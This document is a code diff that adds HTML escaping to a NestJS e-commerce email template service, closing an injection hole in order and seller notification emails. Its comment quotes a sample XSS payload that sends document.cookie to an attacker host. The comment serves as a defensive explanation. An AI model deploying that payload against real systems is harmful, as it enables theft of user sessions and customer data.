@@ -3,6 +3,22 @@ import { ConfigService } from '@nestjs/config';
 export class EmailTemplatesService {
   constructor(private configService: ConfigService) {}
 
+  /**
+   * Escape user-controlled strings before embedding in HTML.
+   * Without this, a seller can name their product
+   * `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">` and
+   * exfiltrate customer data when the order confirmation email renders.
+   */
+  private h(str: unknown): string {
+    if (str == null) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#x27;');
+  }
+
   private getBaseTemplate(content: string, title: string): string {
     const frontendUrl = this.configService.get<string>('FRONTEND_URL') || 'http://localhost:3000';
     const logoUrl = `${frontendUrl}/logo.png`; // You can add a logo later
@@ -177,8 +193,8 @@ export class EmailTemplatesService {
     const itemsHtml = order.items?.map((item: any) => `
       <tr>
         <td style="padding: 12px; border-bottom: 1px solid #e5e7eb;">
-          <p style="margin: 0; color: #1f2937; font-weight: 600; font-size: 15px;">${item.name || 'Product'}</p>
-          <p style="margin: 5px 0 0; color: #6b7280; font-size: 13px;">Quantity: ${item.quantity || 1}</p>
+          <p style="margin: 0; color: #1f2937; font-weight: 600; font-size: 15px;">${this.h(item.name || 'Product')}</p>
+          <p style="margin: 5px 0 0; color: #6b7280; font-size: 13px;">Quantity: ${this.h(item.quantity || 1)}</p>
         </td>
         <td style="padding: 12px; text-align: right; border-bottom: 1px solid #e5e7eb;">
           <p style="margin: 0; color: #1f2937; font-weight: 600; font-size: 15px;">${currencySymbol}${(item.price || 0).toFixed(2)}</p>
@@ -281,19 +297,19 @@ export class EmailTemplatesService {
       
       <div style="background: ${statusColor}; padding: 20px; border-radius: 10px; margin-bottom: 30px; text-align: center;">
         <p style="margin: 0; color: #ffffff; font-size: 20px; font-weight: 600; text-transform: capitalize;">
-          ${statusEmoji} Status: ${status}
+          ${statusEmoji} Status: ${this.h(status)}
         </p>
         <p style="margin: 10px 0 0; color: #ffffff; font-size: 16px; opacity: 0.9;">
-          Order #${orderId}
+          Order #${this.h(orderId)}
         </p>
       </div>
-      
+
       ${order.trackingNumber ? `
       <div style="background-color: #f0f9ff; border-left: 4px solid #0ea5e9; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
         <p style="margin: 0 0 10px; color: #0c4a6e; font-weight: 600; font-size: 15px;">📦 Tracking Information</p>
         <p style="margin: 0; color: #075985; font-size: 14px; line-height: 1.6;">
-          <strong>Tracking Number:</strong> ${order.trackingNumber}<br>
-          ${order.carrier ? `<strong>Carrier:</strong> ${order.carrier}` : ''}
+          <strong>Tracking Number:</strong> ${this.h(order.trackingNumber)}<br>
+          ${order.carrier ? `<strong>Carrier:</strong> ${this.h(order.carrier)}` : ''}
         </p>
       </div>
       ` : ''}
@@ -317,7 +333,7 @@ export class EmailTemplatesService {
         <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
           <span style="font-size: 40px;">🎉</span>
         </div>
-        <h2 style="margin: 0 0 10px; color: #1f2937; font-size: 28px; font-weight: 700;">Congratulations, ${sellerName}!</h2>
+        <h2 style="margin: 0 0 10px; color: #1f2937; font-size: 28px; font-weight: 700;">Congratulations, ${this.h(sellerName)}!</h2>
         <p style="margin: 0; color: #6b7280; font-size: 16px;">Your seller account has been approved</p>
       </div>
       
@@ -368,9 +384,9 @@ export class EmailTemplatesService {
       
       <div style="background-color: #fef2f2; border-left: 4px solid #ef4444; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
         <p style="margin: 0; color: #991b1b; font-size: 15px; line-height: 1.6;">
-          Dear ${sellerName},<br><br>
+          Dear ${this.h(sellerName)},<br><br>
           We regret to inform you that your seller account application has not been approved at this time.
-          ${reason ? `<br><br><strong>Reason:</strong> ${reason}` : ''}
+          ${reason ? `<br><br><strong>Reason:</strong> ${this.h(reason)}` : ''}
         </p>
       </div>
       
